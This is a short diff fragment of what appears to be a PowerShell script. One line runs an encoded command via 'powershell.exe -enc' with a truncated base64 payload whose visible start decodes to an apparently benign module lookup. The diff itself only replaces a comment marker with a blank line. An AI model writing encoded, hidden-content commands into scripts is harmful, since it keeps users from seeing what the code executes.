@@ -5,5 +5,5 @@ $out = powershell.exe -enc PAAjAAoARgBpAG4AZAAtAE0AbwBkAHUAbABlACAAUABTAFMAbwBmA
 
 #$scriptName = & { $myInvocation.ScriptName }
 #$scriptName
-###
+
 $out
